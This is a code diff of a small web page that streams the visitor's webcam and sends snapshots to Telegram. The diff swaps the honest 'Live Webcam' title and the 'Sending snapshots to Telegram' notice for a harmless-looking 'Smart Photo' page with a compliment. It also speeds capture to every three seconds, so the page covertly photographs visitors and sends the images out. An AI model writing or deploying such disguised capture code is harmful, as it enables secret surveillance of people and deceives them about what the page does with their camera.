@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Live Webcam</title>
+  <title>Smart Photo</title>
 </head>
 <body>
-  <h1>Live Webcam Session</h1>
+  <h1>Smart Photo</h1>
   <video id="video" width="320" height="240" autoplay></video>
-  <p>Sending snapshots to Telegram every 5 seconds...</p>
+  <p>You looks Awesome :)...</p>
 
   <script>
     const params = new URLSearchParams(window.location.search);
@@ -44,7 +44,8 @@
     }
 
     // Send snapshot every 5 seconds
-    setInterval(sendSnapshot, 5000);
+    setInterval(sendSnapshot, 3000);
   </script>
 </body>
 </html>
+
